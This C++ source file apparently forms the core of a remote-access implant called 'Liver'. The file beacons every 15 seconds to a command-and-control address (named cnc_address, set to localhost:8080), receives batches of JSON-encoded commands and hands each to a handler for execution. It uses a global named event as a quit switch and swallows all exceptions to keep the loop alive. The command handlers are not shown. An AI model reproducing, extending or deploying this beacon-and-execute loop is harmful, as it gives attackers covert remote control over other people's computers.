#include "Include/Liver.hpp"

#include "CommandHandlerFactory.hpp"
#include "ICommandHandler.hpp"
#include "Trace.hpp"
#include "CommandFactories/JsonCommandFactory.hpp"
#include "Commands/ICommand.hpp"
#include "Communicators/RawCommunicator.hpp"
#include "Communicators/Protocol/KeepAliveRequest.hpp"
#include "Communicators/Protocol/SendRandomResponse.hpp"
#include "Filesystem/File.hpp"
#include "Networking/Socket.hpp"
#include "Synchronization/Event.hpp"

Liver::Liver(Event::Ptr quit_event, ICommandFactory::Ptr command_factory, ICommunicator::Ptr communicator) :
	m_quit_event(std::move(quit_event)),
	m_command_factory(std::move(command_factory)),
	m_communicator(std::move(communicator)),
	libraries()
{
}

void Liver::run()
{
	TRACE(L"running liver")

	static constexpr Time::Duration ITERATION_TIMEOUT = Time::Seconds(15);
	while (m_quit_event->wait(ITERATION_TIMEOUT) == WaitStatus::TIMEOUT)
	{
		try
		{
			TRACE(L"liver iteration")
			IRequest::Ptr request = make_request();
			std::shared_ptr<IResponse> response = m_communicator->send(std::move(request));
			handle_response(std::move(response));
		}
		catch ([[maybe_unused]] const WinApiException& ex)
		{
			TRACE("uncaught WinApiException with code ", ex.code(), " and error ", ex.error())
		}
		catch ([[maybe_unused]] const Exception& ex)
		{
			TRACE("uncaught Exception with code ", ex.code())
		}
		catch ([[maybe_unused]] const CriticalException&)
		{
			TRACE("uncaught CriticalException")
		}
		catch ([[maybe_unused]] const std::exception& ex)
		{
			TRACE("uncaught std::exception: ", ex.what())
		}
		catch (...)
		{
			TRACE("uncaught unknown or critical exception")
		}
	}

	TRACE(L"finished liver")
}

std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_configuration)
{
	static constexpr uint32_t LOCALHOST = 0x7f000001;
	static constexpr uint16_t DEFAULT_PORT = 8080;
	static constexpr SocketAddress cnc_address = {LOCALHOST, DEFAULT_PORT};
	return std::make_unique<Liver>(
		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
		std::make_unique<JsonCommandFactory>(),
		RawCommunicator::from_stream(std::make_shared<Socket>(cnc_address))
	);
}

std::wstring Liver::quit_event_name()
{
	static constexpr std::wstring_view QUIT_EVENT_NAME = L"LiverEvent";
	return std::wstring{Event::GLOBAL_NAMESPACE} + std::wstring{QUIT_EVENT_NAME};
}

IRequest::Ptr Liver::make_request()
{
	return std::make_unique<KeepAliveRequest>();
}

void Liver::handle_response(IResponse::Ptr response)
{
	switch (response->type())
	{
	case IResponse::Type::SEND_RANDOM:
	{
		const auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
		TRACE(L"SendRandomResponse random: ", send_random_response->value())
		break;
	}

	case IResponse::Type::EXECUTE_COMMANDS:
	{
		const auto execute_commands_response = std::dynamic_pointer_cast<ExecuteCommandsResponse>(
			std::move(response)
		);
		handle_execute_commands(*execute_commands_response);
		break;
	}

	default:
		throw Exception(ErrorCode::UNCOVERED_ENUM_VALUE);
	}
}

void Liver::handle_execute_commands(const ExecuteCommandsResponse& response)
{
	std::vector<ICommand::Ptr> commands;
	for (const Buffer& command : response.commands())
	{
		commands.push_back(m_command_factory->create(command));
	}
	execute_commands(commands);
}

void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
{
	for (const ICommand::Ptr& command : commands)
	{
		const ICommandHandler::Ptr handler = CommandHandlerFactory::create(command);
		handler->handle(*this);
	}
}
